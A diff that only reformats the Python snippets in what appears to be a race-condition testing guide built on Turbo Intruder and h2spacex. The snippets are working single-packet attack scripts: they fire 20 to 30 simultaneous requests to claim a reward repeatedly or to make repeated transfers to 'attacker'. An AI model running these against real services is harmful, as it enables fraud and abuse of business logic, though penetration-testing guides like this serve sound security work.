@@ -162,24 +162,26 @@ Repository: [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-in
 
 ```python
 for _ in range(N):
-    engine.queue(request, gate='race1')
-engine.openGate('race1')
+    engine.queue(request, gate="race1")
+engine.openGate("race1")
 ```
 
 ```python
 def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-                           concurrentConnections=30,
-                           requestsPerConnection=30,
-                           pipeline=False,
-                           engine=Engine.THREADED,
-                           maxRetriesPerRequest=0
-                           )
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=30,
+        requestsPerConnection=30,
+        pipeline=False,
+        engine=Engine.THREADED,
+        maxRetriesPerRequest=0,
+    )
 
     for i in range(30):
-        engine.queue(target.req, gate='race1')
+        engine.queue(target.req, gate="race1")
 
-    engine.openGate('race1')
+    engine.openGate("race1")
+
 
 def handleResponse(req, interesting):
     table.add(req)
@@ -199,19 +201,20 @@ Turbo Intruder replaces `%s` per request when paired with a wordlist (or other p
 
 ```python
 def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-                           concurrentConnections=30,
-                           requestsPerConnection=30,
-                           pipeline=False,
-                           engine=Engine.THREADED,
-                           maxRetriesPerRequest=0
-                           )
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=30,
+        requestsPerConnection=30,
+        pipeline=False,
+        engine=Engine.THREADED,
+        maxRetriesPerRequest=0,
+    )
 
-    engine.queue(post_to_target1, gate='race1')
+    engine.queue(post_to_target1, gate="race1")
     for _ in range(30):
-        engine.queue(get_target2, gate='race1')
+        engine.queue(get_target2, gate="race1")
 
-    engine.openGate('race1')
+    engine.openGate("race1")
 ```
 
 Adjust hosts/paths by duplicating `RequestEngine` instances if endpoints differ (Turbo Intruder supports multiple engines — consult upstream docs for your Burp version).
@@ -328,27 +331,25 @@ First-to-last request dispatch gap: **< 100 μs** on modern servers — orders o
 ```python
 import h2spacex
 
-h2_conn = h2spacex.H2OnTCPSocket(
-    hostname='target.example.com',
-    port_number=443
-)
+h2_conn = h2spacex.H2OnTCPSocket(hostname="target.example.com", port_number=443)
 
 headers_list = []
 for i in range(20):
-    headers_list.append([
-        (':method', 'POST'),
-        (':path', '/api/v1/rewards/claim'),
-        (':authority', 'target.example.com'),
-        (':scheme', 'https'),
-        ('content-type', 'application/json'),
-        ('authorization', 'Bearer TOKEN'),
-    ])
+    headers_list.append(
+        [
+            (":method", "POST"),
+            (":path", "/api/v1/rewards/claim"),
+            (":authority", "target.example.com"),
+            (":scheme", "https"),
+            ("content-type", "application/json"),
+            ("authorization", "Bearer TOKEN"),
+        ]
+    )
 
 h2_conn.setup_connection()
 h2_conn.send_ping_frame()
 h2_conn.send_multiple_requests_at_once(
-    headers_list,
-    body_list=[b'{"reward_id":"welcome_bonus"}'] * 20
+    headers_list, body_list=[b'{"reward_id":"welcome_bonus"}'] * 20
 )
 responses = h2_conn.read_multiple_responses()
 ```
@@ -510,11 +511,11 @@ Upgrade may succeed during the brief window where verification is processing but
 Burp Repeater: add requests targeting **different paths** to the same group → "Send group (single packet)".
 
 ```python
-headers_balance = [(':method','GET'), (':path','/api/balance'), ...]
-headers_transfer = [(':method','POST'), (':path','/api/transfer'), ...]
+headers_balance = [(":method", "GET"), (":path", "/api/balance"), ...]
+headers_transfer = [(":method", "POST"), (":path", "/api/transfer"), ...]
 
-all_headers = [headers_balance] + [headers_transfer]*5 + [headers_balance]
-all_bodies = [b''] + [b'{"to":"attacker","amount":100}']*5 + [b'']
+all_headers = [headers_balance] + [headers_transfer] * 5 + [headers_balance]
+all_bodies = [b""] + [b'{"to":"attacker","amount":100}'] * 5 + [b""]
 
 h2_conn.send_multiple_requests_at_once(all_headers, body_list=all_bodies)
 ```
